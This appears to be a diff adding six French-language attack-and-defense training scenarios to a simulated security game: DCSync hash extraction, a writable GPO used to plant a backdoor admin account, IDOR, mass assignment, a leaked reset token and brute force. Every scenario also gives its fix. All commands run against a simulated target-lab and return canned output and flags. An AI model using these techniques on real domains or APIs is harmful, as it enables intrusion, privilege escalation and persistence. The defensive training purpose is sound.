+/* ===================== 38. Droits de réplication AD excessifs (DCSync) ===================== */
+{
+  id:'ad-dcsync-abuse',
+  title:'Un compte de service disposant à tort des droits de réplication du domaine (DCSync)',
+  category:'Active Directory (abus DCSync)',
+  attack:{
+    who:'Vous incarnez bob, qui a compromis le compte de service `svc-monitor` (identifiants trouvés dans un script de supervision).',
+    desc:"Le compte `svc-monitor` s'est vu accorder par erreur les droits « Replicating Directory Changes » et « Replicating Directory Changes All » sur le domaine — des droits normalement réservés aux contrôleurs de domaine. Utilisez ces droits pour simuler une réplication et extraire les identifiants de tous les comptes du domaine, y compris `krbtgt`.",
+    hints:[
+      "`net user svc-monitor /domain` confirme l'identité du compte et rappelle son usage prévu (supervision, aucun besoin de réplication).",
+      "`dcsync-check svc-monitor` interroge les droits de réplication ACL du domaine associés au compte : le résultat révèle les deux droits accordés à tort.",
+      "`dcsync krbtgt` simule une demande de réplication ciblée sur le compte `krbtgt`, dont le hash permet ensuite de forger des tickets Kerberos valides pour n'importe quel utilisateur du domaine (Golden Ticket)."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
+    desc:"Retirez les droits de réplication accordés à tort au compte `svc-monitor` — un compte de supervision n'a besoin d'aucun droit de réplication du domaine.",
+    hints:[
+      "Éditez `/etc/ad/acl/svc-monitor-replication.json` avec `nano` et remplacez `\"replicationRights\": true` par `\"replicationRights\": false`.",
+      "`verify` confirme que le compte n'a plus aucun droit de réplication."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
+      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['acl']},
+      '/etc/ad/acl':{type:'dir',perm:'755',owner:'root',children:['svc-monitor-replication.json']},
+      '/etc/ad/acl/svc-monitor-replication.json':{type:'file',perm:'644',owner:'root',size:120,
+        content:"{\n  \"account\": \"svc-monitor\",\n  \"intendedUse\": \"supervision applicative\",\n  \"replicationRights\": true\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^net\s+user\s+svc-monitor\s+\/domain$/, run(state, print){
+        print('Nom du compte     svc-monitor', 'out');
+        print('Usage prévu       Supervision applicative (lecture seule)', 'out');
+      }
+    },
+    { pattern:/^dcsync-check\s+svc-monitor$/, run(state, print){
+        const over = /"replicationRights":\s*true/.test(state.vfs['/etc/ad/acl/svc-monitor-replication.json'].content);
+        if(over){
+          state.flags = state.flags || {};
+          state.flags.checked = true;
+          print('Droits ACL délégués à svc-monitor sur le domaine :', 'out');
+          print('  - Replicating Directory Changes', 'out');
+          print('  - Replicating Directory Changes All', 'out');
+        } else {
+          print('Aucun droit de réplication délégué à svc-monitor.', 'out');
+        }
+      }
+    },
+    { pattern:/^dcsync\s+krbtgt$/, run(state, print){
+        const over = /"replicationRights":\s*true/.test(state.vfs['/etc/ad/acl/svc-monitor-replication.json'].content);
+        if(!over){ print('[DRSUAPI] DRS_ERROR_ACCESS_DENIED — droits de réplication insuffisants.', 'err'); return; }
+        if(!state.flags || !state.flags.checked){ print('dcsync: vérifiez d\'abord les droits disponibles avec dcsync-check.', 'err'); return; }
+        state.flags.dumped = true;
+        print('[DRSUAPI] Réplication simulée acceptée (droits Replicating Directory Changes All).', 'ok');
+        print('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7a8f2c1e9b3d4f5a6c7e8f9a0b1c2d3e:::', 'ok');
+        print("[+] Hash NTLM de krbtgt extrait — falsification de tickets (Golden Ticket) désormais possible.", 'ok');
+        print("FLAG{dcsync_replication_rights_krbtgt_hash}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.dumped === true; },
+  defenseCheck(state){ return /"replicationRights":\s*false/.test(state.vfs['/etc/ad/acl/svc-monitor-replication.json'].content); },
+  replay(state){
+    const log=[];
+    const over = /"replicationRights":\s*true/.test(state.vfs['/etc/ad/acl/svc-monitor-replication.json'].content);
+    log.push({t:'$ dcsync krbtgt', cls:'prompt-line'});
+    if(!over){
+      log.push({t:'[DRSUAPI] DRS_ERROR_ACCESS_DENIED — droits de réplication insuffisants.', cls:'err'});
+      log.push({t:"[-] Les droits de réplication ont été retirés : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7a8f2c1e9b3d4f5a6c7e8f9a0b1c2d3e:::', cls:'ok'});
+    log.push({t:'[+] Hash NTLM de krbtgt extrait via une réplication de domaine abusive.', cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 39. GPO modifiable par un groupe sur-privilégié (Active Directory) ===================== */
+{
+  id:'ad-gpo-writable',
+  title:'Une stratégie de groupe (GPO) modifiable par tous les utilisateurs du domaine',
+  category:'Active Directory (GPO modifiable)',
+  attack:{
+    who:'Vous incarnez bob, un utilisateur standard du domaine.',
+    desc:"La GPO « Déploiement-Postes » s'applique à l'unité d'organisation contenant les postes des administrateurs, mais son ACL autorise en écriture le groupe « Utilisateurs du domaine » au lieu du seul groupe « Admins du domaine ». Modifiez son script de démarrage pour y ajouter un compte administrateur local, qui sera créé sur chaque poste administrateur au prochain rafraîchissement de stratégie.",
+    hints:[
+      "`cat /etc/ad/gpo/deploiement-postes.json` montre l'ACL de la GPO : le groupe « Utilisateurs du domaine » y a le droit d'écriture, en plus des administrateurs.",
+      "Éditez `/etc/ad/gpo/deploiement-postes-startup.ps1` avec `nano` et ajoutez une ligne créant un compte administrateur local, par exemple `net user backdoor P@ss123! /add` suivie de `net localgroup administrators backdoor /add`.",
+      "`gpupdate /force` simule le rafraîchissement de la stratégie de groupe sur les postes administrateurs ciblés par cette GPO, exécutant votre script."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
+    desc:"Corrigez l'ACL de la GPO pour que seul le groupe « Admins du domaine » puisse la modifier.",
+    hints:[
+      "Éditez `/etc/ad/gpo/deploiement-postes.json` avec `nano` et remplacez `\"Utilisateurs du domaine\"` par `\"Admins du domaine\"` dans la liste des groupes autorisés en écriture.",
+      "`verify` confirme que seuls les administrateurs du domaine peuvent modifier cette GPO."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
+      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['gpo']},
+      '/etc/ad/gpo':{type:'dir',perm:'755',owner:'root',children:['deploiement-postes.json','deploiement-postes-startup.ps1']},
+      '/etc/ad/gpo/deploiement-postes.json':{type:'file',perm:'644',owner:'root',size:130,
+        content:"{\n  \"name\": \"Déploiement-Postes\",\n  \"appliedTo\": \"OU=Postes-Admins,DC=lab,DC=local\",\n  \"writeGroups\": [\"Admins du domaine\", \"Utilisateurs du domaine\"]\n}\n"},
+      '/etc/ad/gpo/deploiement-postes-startup.ps1':{type:'file',perm:'664',owner:'bob',size:60,
+        content:"# Script de démarrage — Déploiement-Postes\nWrite-Host 'Poste initialisé'\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^gpupdate\s+\/force$/, run(state, print){
+        const acl = state.vfs['/etc/ad/gpo/deploiement-postes.json'].content;
+        const over = /"Utilisateurs du domaine"/.test(acl);
+        const script = state.vfs['/etc/ad/gpo/deploiement-postes-startup.ps1'].content;
+        const payload = /net user backdoor .* \/add/.test(script) && /net localgroup administrators backdoor \/add/.test(script);
+        if(!over){ print('[gpsvc] Déploiement-Postes appliquée (aucune modification non autorisée détectée).', 'info'); return; }
+        if(!payload){ print("[gpsvc] Stratégie rafraîchie, script de démarrage exécuté sans modification suspecte — éditez d'abord le script.", 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.persisted = true;
+        print('[gpsvc] Stratégie « Déploiement-Postes » rafraîchie sur les postes administrateurs.', 'info');
+        print("[+] Script de démarrage exécuté : compte 'backdoor' créé et ajouté aux administrateurs locaux sur chaque poste administrateur.", 'ok');
+        print("FLAG{gpo_acl_trop_large_backdoor_admin_postes}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){ return !/"Utilisateurs du domaine"/.test(state.vfs['/etc/ad/gpo/deploiement-postes.json'].content); },
+  replay(state){
+    const log=[];
+    const over = /"Utilisateurs du domaine"/.test(state.vfs['/etc/ad/gpo/deploiement-postes.json'].content);
+    log.push({t:'$ gpupdate /force', cls:'prompt-line'});
+    if(!over){
+      log.push({t:'[gpsvc] Déploiement-Postes appliquée (aucune modification non autorisée détectée).', cls:'err'});
+      log.push({t:"[-] L'ACL de la GPO ne permet plus l'écriture par tous les utilisateurs : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:"[+] Script de démarrage exécuté : compte 'backdoor' créé et ajouté aux administrateurs locaux.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 40. IDOR — référence directe non sécurisée à un objet ===================== */
+{
+  id:'idor-invoice-api',
+  title:'Référence directe non sécurisée à un objet (IDOR) sur l\'API de facturation',
+  category:'API web (IDOR / Broken Object Level Authorization)',
+  attack:{
+    who:'Vous incarnez bob, client authentifié sur l\'API de facturation de target-lab (identifiant client 1042).',
+    desc:"L'API expose les factures par identifiant numérique séquentiel (`/invoices/<id>`) et ne vérifie jamais que la facture demandée appartient bien au client authentifié. Consultez votre propre facture, puis élargissez l'accès à celle d'un autre client pour en extraire des données sensibles.",
+    hints:[
+      "`curl http://api.target-lab/invoices/1042 -H 'Authorization: Bearer bob-token'` renvoie votre propre facture : le format d'URL est prévisible et purement numérique.",
+      "Rien n'indique que l'identifiant 1042 vous soit réservé — essayez un identifiant client voisin, par exemple `curl http://api.target-lab/invoices/1001 -H 'Authorization: Bearer bob-token'`.",
+      "Si l'API ne vérifie pas le propriétaire de la ressource demandée, elle renverra la facture d'un autre client — potentiellement le compte administrateur (identifiant 1001) — sans aucune erreur d'autorisation."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
+    desc:"Forcez la vérification que la facture demandée appartient bien au client authentifié, sans casser l'accès légitime de chaque client à ses propres factures.",
+    hints:[
+      "Éditez `/etc/api/invoices-config.yml` avec `nano` et passez `enforce_ownership` à `true`.",
+      "`verify` confirme que le contrôle de propriété est désormais appliqué avant de renvoyer une facture."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
+      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['invoices-config.yml']},
+      '/etc/api/invoices-config.yml':{type:'file',perm:'644',owner:'root',size:30,
+        content:"enforce_ownership: false\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^curl\s+http:\/\/api\.target-lab\/invoices\/1042\s+-H\s+'Authorization:\s+Bearer\s+bob-token'$/, run(state, print){
+        print('{"invoice_id":1042,"owner":"bob","amount":"49.90€","items":["Abonnement mensuel"]}', 'out');
+      }
+    },
+    { pattern:/^curl\s+http:\/\/api\.target-lab\/invoices\/1001\s+-H\s+'Authorization:\s+Bearer\s+bob-token'$/, run(state, print){
+        const enforced = /enforce_ownership:\s*true/.test(state.vfs['/etc/api/invoices-config.yml'].content);
+        if(enforced){ print('403 Forbidden: cette facture appartient à un autre client.', 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.leaked = true;
+        print('{"invoice_id":1001,"owner":"admin","amount":"12400.00€","items":["Licence entreprise annuelle"],"note":"Code d\'accès coffre: 7734-ADMIN"}', 'out');
+        print("[+] Facture d'un autre client obtenue sans aucune vérification de propriété (IDOR).", 'ok');
+        print("FLAG{idor_invoice_api_ownership_check_absent}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.leaked === true; },
+  defenseCheck(state){ return /enforce_ownership:\s*true/.test(state.vfs['/etc/api/invoices-config.yml'].content); },
+  replay(state){
+    const log=[];
+    const enforced = /enforce_ownership:\s*true/.test(state.vfs['/etc/api/invoices-config.yml'].content);
+    log.push({t:"$ curl http://api.target-lab/invoices/1001 -H 'Authorization: Bearer bob-token'", cls:'prompt-line'});
+    if(enforced){
+      log.push({t:'403 Forbidden: cette facture appartient à un autre client.', cls:'err'});
+      log.push({t:"[-] Le contrôle de propriété est désormais appliqué : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'{"invoice_id":1001,"owner":"admin","amount":"12400.00€", ...}', cls:'ok'});
+    log.push({t:"[+] Facture d'un autre client obtenue via IDOR.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 41. Affectation de masse (mass assignment) à l'inscription ===================== */
+{
+  id:'mass-assignment-signup',
+  title:'Affectation de masse (mass assignment) lors de l\'inscription utilisateur',
+  category:'API web (Mass Assignment)',
+  attack:{
+    who:'Vous incarnez eve, une visiteuse externe sans compte sur l\'application de target-lab.',
+    desc:"Le point d'entrée d'inscription construit l'utilisateur directement à partir de l'intégralité du corps JSON envoyé, sans filtrer les champs autorisés. Inscrivez-vous en glissant un champ supplémentaire non prévu par le formulaire pour vous attribuer un rôle privilégié dès la création du compte.",
+    hints:[
+      "Le formulaire d'inscription officiel n'envoie que `username` et `password` — mais rien n'empêche d'envoyer des champs supplémentaires dans la requête brute.",
+      "`curl -X POST http://api.target-lab/signup -H 'Content-Type: application/json' -d '{\"username\":\"eve\",\"password\":\"Passw0rd!\",\"role\":\"admin\"}'` glisse un champ `role` non prévu dans le corps de la requête.",
+      "Si le serveur construit l'utilisateur à partir de l'objet JSON complet sans filtrer les champs autorisés, ce `role` sera accepté tel quel — vérifiez ensuite avec `curl http://api.target-lab/admin -H 'Authorization: Bearer eve-token'`."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur applicatif chargé de corriger la faille.',
+    desc:"Ne construisez plus jamais l'utilisateur depuis l'objet JSON complet reçu : n'acceptez explicitement que les champs prévus par le formulaire d'inscription.",
+    hints:[
+      "Éditez `/opt/api/signup.py` avec `nano` et remplacez la construction `User(**request.json)` par une construction explicite `User(username=request.json['username'], password=request.json['password'])`, sans jamais reprendre `role` depuis la requête.",
+      "`verify` confirme que l'utilisateur n'est plus construit à partir de l'ensemble du corps JSON reçu."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','opt']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['eve']},
+      '/home/eve':{type:'dir',perm:'755',owner:'eve',children:[]},
+      '/opt':{type:'dir',perm:'755',owner:'root',children:['api']},
+      '/opt/api':{type:'dir',perm:'755',owner:'root',children:['signup.py']},
+      '/opt/api/signup.py':{type:'file',perm:'644',owner:'root',size:150,
+        content:"from flask import request\nfrom models import User\n\ndef signup():\n    user = User(**request.json)\n    user.role = user.role or 'user'\n    user.save()\n    return {'created': user.username}\n"}
+    };
+  },
+  startUserAttack:'eve', startCwdAttack:'/home/eve',
+  exploitRules:[
+    { pattern:/^curl\s+-X\s+POST\s+http:\/\/api\.target-lab\/signup\s+-H\s+'Content-Type:\s+application\/json'\s+-d\s+'\{"username":"eve","password":"Passw0rd!","role":"admin"\}'$/, run(state, print){
+        const vulnerable = /User\(\*\*request\.json\)/.test(state.vfs['/opt/api/signup.py'].content);
+        state.flags = state.flags || {};
+        if(!vulnerable){
+          print('{"created":"eve","role":"user"}', 'out');
+          print("[i] Le champ role a été ignoré : seuls username et password ont été pris en compte.", 'info');
+          return;
+        }
+        state.flags.signedUpAsAdmin = true;
+        print('{"created":"eve","role":"admin"}', 'out');
+        print("[i] Le champ role, absent du formulaire officiel, a été accepté tel quel (affectation de masse confirmée).", 'info');
+      }
+    },
+    { pattern:/^curl\s+http:\/\/api\.target-lab\/admin\s+-H\s+'Authorization:\s+Bearer\s+eve-token'$/, run(state, print){
+        if(!state.flags || !state.flags.signedUpAsAdmin){
+          print('403 Forbidden: privilèges insuffisants.', 'err');
+          return;
+        }
+        state.flags.adminAccess = true;
+        print('{"panel":"admin","users":142,"pending_invoices":37}', 'out');
+        print("[+] Accès administrateur obtenu dès l'inscription via affectation de masse (mass assignment).", 'ok');
+        print("FLAG{mass_assignment_signup_role_non_filtre}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.adminAccess === true; },
+  defenseCheck(state){ return !/User\(\*\*request\.json\)/.test(state.vfs['/opt/api/signup.py'].content); },
+  replay(state){
+    const log=[];
+    const vulnerable = /User\(\*\*request\.json\)/.test(state.vfs['/opt/api/signup.py'].content);
+    log.push({t:"$ curl -X POST .../signup -d '{\"username\":\"eve\",\"password\":\"Passw0rd!\",\"role\":\"admin\"}'", cls:'prompt-line'});
+    if(!vulnerable){
+      log.push({t:'{"created":"eve","role":"user"}', cls:'err'});
+      log.push({t:"[-] Le champ role n'est plus repris depuis la requête : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'{"panel":"admin","users":142,"pending_invoices":37}', cls:'ok'});
+    log.push({t:"[+] Accès administrateur obtenu dès l'inscription via mass assignment.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 42. Exposition excessive de données ===================== */
+{
+  id:'excessive-data-exposure-api',
+  title:'Exposition excessive de données sur le point d\'entrée annuaire des utilisateurs',
+  category:'API web (Excessive Data Exposure)',
+  attack:{
+    who:'Vous incarnez bob, utilisateur authentifié sur l\'API de target-lab.',
+    desc:"Le point d'entrée `/users`, censé fournir un simple annuaire public (nom, identifiant), renvoie en réalité l'objet base de données complet de chaque utilisateur — y compris des champs sensibles jamais affichés par l'application officielle. Exploitez cette fuite pour usurper le compte administrateur.",
+    hints:[
+      "`curl http://api.target-lab/users -H 'Authorization: Bearer bob-token'` liste les utilisateurs : inspectez la réponse brute plutôt que de vous fier à ce qu'affiche l'interface web habituelle.",
+      "L'entrée de l'administrateur contient un champ `password_reset_token` qui ne devrait jamais transiter dans une réponse d'annuaire public.",
+      "Réutilisez ce jeton pour réinitialiser le mot de passe administrateur : `curl -X POST http://api.target-lab/reset-password -H 'Content-Type: application/json' -d '{\"token\":\"rt_9f2ab7c1\",\"new_password\":\"Hacked123!\"}'`",
+      "Connectez-vous ensuite avec les nouveaux identifiants : `curl -u admin:Hacked123! http://api.target-lab/admin`"
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
+    desc:"Limitez la réponse de l'annuaire aux seuls champs publics prévus, sans exposer l'objet base de données complet.",
+    hints:[
+      "Éditez `/etc/api/users-config.yml` avec `nano` et passez `expose_full_profile` à `false`.",
+      "`verify` confirme que seuls les champs publics sont désormais renvoyés par l'annuaire."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
+      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['users-config.yml']},
+      '/etc/api/users-config.yml':{type:'file',perm:'644',owner:'root',size:30,
+        content:"expose_full_profile: true\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^curl\s+http:\/\/api\.target-lab\/users\s+-H\s+'Authorization:\s+Bearer\s+bob-token'$/, run(state, print){
+        const exposed = /expose_full_profile:\s*true/.test(state.vfs['/etc/api/users-config.yml'].content);
+        if(!exposed){
+          print('[{"id":1042,"name":"bob"},{"id":1,"name":"admin"}]', 'out');
+          print("[i] Seuls les champs publics (id, name) sont renvoyés.", 'info');
+          return;
+        }
+        state.flags = state.flags || {};
+        state.flags.tokenLeaked = true;
+        print('[{"id":1042,"name":"bob","password_hash":"$2b$...","password_reset_token":null},{"id":1,"name":"admin","password_hash":"$2b$...","password_reset_token":"rt_9f2ab7c1"}]', 'out');
+        print("[i] Le champ password_reset_token de l'administrateur n'aurait jamais dû transiter dans cette réponse.", 'info');
+      }
+    },
+    { pattern:/^curl\s+-X\s+POST\s+http:\/\/api\.target-lab\/reset-password\s+-H\s+'Content-Type:\s+application\/json'\s+-d\s+'\{"token":"rt_9f2ab7c1","new_password":"Hacked123!"\}'$/, run(state, print){
+        if(!state.flags || !state.flags.tokenLeaked){
+          print('400 Bad Request: jeton de réinitialisation invalide.', 'err');
+          return;
+        }
+        state.flags.passwordReset = true;
+        print('{"status":"password updated"}', 'out');
+        print("[i] Mot de passe administrateur réinitialisé via le jeton exposé.", 'info');
+      }
+    },
+    { pattern:/^curl\s+-u\s+admin:Hacked123!\s+http:\/\/api\.target-lab\/admin$/, run(state, print){
+        if(!state.flags || !state.flags.passwordReset){
+          print('401 Unauthorized: identifiants invalides.', 'err');
+          return;
+        }
+        state.flags.adminAccess = true;
+        print('{"panel":"admin","users":142,"pending_invoices":37}', 'out');
+        print("[+] Accès administrateur obtenu via un jeton de réinitialisation exposé dans une réponse trop bavarde.", 'ok');
+        print("FLAG{excessive_data_exposure_reset_token_leak}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.adminAccess === true; },
+  defenseCheck(state){ return !/expose_full_profile:\s*true/.test(state.vfs['/etc/api/users-config.yml'].content); },
+  replay(state){
+    const log=[];
+    const exposed = /expose_full_profile:\s*true/.test(state.vfs['/etc/api/users-config.yml'].content);
+    log.push({t:"$ curl http://api.target-lab/users -H 'Authorization: Bearer bob-token'", cls:'prompt-line'});
+    if(!exposed){
+      log.push({t:'[{"id":1042,"name":"bob"},{"id":1,"name":"admin"}]', cls:'err'});
+      log.push({t:"[-] Seuls les champs publics sont désormais renvoyés : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'[...,{"id":1,"name":"admin","password_reset_token":"rt_9f2ab7c1"}]', cls:'ok'});
+    log.push({t:"[+] Accès administrateur obtenu via le jeton de réinitialisation exposé.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 43. Absence de limitation de débit (brute force) ===================== */
+{
+  id:'missing-rate-limit-bruteforce',
+  title:'Absence de limitation de débit sur l\'authentification',
+  category:'API web (Missing Rate Limiting / Brute Force)',
+  attack:{
+    who:'Vous incarnez eve, une attaquante externe sans identifiants valides sur l\'API de target-lab.',
+    desc:"Le point d'entrée de connexion n'impose aucune limite de tentatives : aucun verrouillage de compte, aucun ralentissement, aucun CAPTCHA après échec. Exploitez cette absence de limitation de débit pour deviner par force brute le mot de passe administrateur, puis connectez-vous.",
+    hints:[
+      "`curl-bruteforce --user admin --wordlist common-passwords.txt --target http://api.target-lab/login` rejoue rapidement un dictionnaire de mots de passe courants contre le compte admin.",
+      "Sans limitation de débit, rien n'interrompt la série de tentatives avant qu'un mot de passe corresponde.",
+      "Une fois un mot de passe trouvé par la commande précédente, connectez-vous avec : `curl -u admin:Summer2024! http://api.target-lab/admin`"
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
+    desc:"Activez une limitation de débit sur l'authentification, pour bloquer les tentatives répétées sans gêner un utilisateur légitime qui se trompe occasionnellement.",
+    hints:[
+      "Éditez `/etc/api/login-config.yml` avec `nano` et passez `rate_limit_enabled` à `true`.",
+      "`verify` confirme que la limitation de débit est désormais active sur l'authentification."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['eve']},
+      '/home/eve':{type:'dir',perm:'755',owner:'eve',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
+      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['login-config.yml']},
+      '/etc/api/login-config.yml':{type:'file',perm:'644',owner:'root',size:40,
+        content:"rate_limit_enabled: false\nmax_attempts: 0\n"}
+    };
+  },
+  startUserAttack:'eve', startCwdAttack:'/home/eve',
+  exploitRules:[
+    { pattern:/^curl-bruteforce\s+--user\s+admin\s+--wordlist\s+common-passwords\.txt\s+--target\s+http:\/\/api\.target-lab\/login$/, run(state, print){
+        const limited = /rate_limit_enabled:\s*true/.test(state.vfs['/etc/api/login-config.yml'].content);
+        if(limited){
+          print('429 Too Many Requests: compte verrouillé après 5 tentatives échouées.', 'err');
+          return;
+        }
+        state.flags = state.flags || {};
+        state.flags.crackedPassword = true;
+        print('[+] Mot de passe trouvé après 1847 tentatives : admin:Summer2024!', 'ok');
+      }
+    },
+    { pattern:/^curl\s+-u\s+admin:Summer2024!\s+http:\/\/api\.target-lab\/admin$/, run(state, print){
+        if(!state.flags || !state.flags.crackedPassword){
+          print('401 Unauthorized: identifiants invalides.', 'err');
+          return;
+        }
+        state.flags.adminAccess = true;
+        print('{"panel":"admin","users":142,"pending_invoices":37}', 'out');
+        print("[+] Accès administrateur obtenu par force brute, faute de limitation de débit.", 'ok');
+        print("FLAG{missing_rate_limit_bruteforce_admin}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.adminAccess === true; },
+  defenseCheck(state){ return /rate_limit_enabled:\s*true/.test(state.vfs['/etc/api/login-config.yml'].content); },
+  replay(state){
+    const log=[];
+    const limited = /rate_limit_enabled:\s*true/.test(state.vfs['/etc/api/login-config.yml'].content);
+    log.push({t:"$ curl-bruteforce --user admin --wordlist common-passwords.txt --target http://api.target-lab/login", cls:'prompt-line'});
+    if(limited){
+      log.push({t:'429 Too Many Requests: compte verrouillé après 5 tentatives échouées.', cls:'err'});
+      log.push({t:"[-] La limitation de débit est désormais active : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'[+] Mot de passe trouvé par force brute : admin:Summer2024!', cls:'ok'});
+    log.push({t:"[+] Accès administrateur obtenu par force brute.", cls:'ok'});
+    return {log, success:true};
+  }
 }
 
 ];
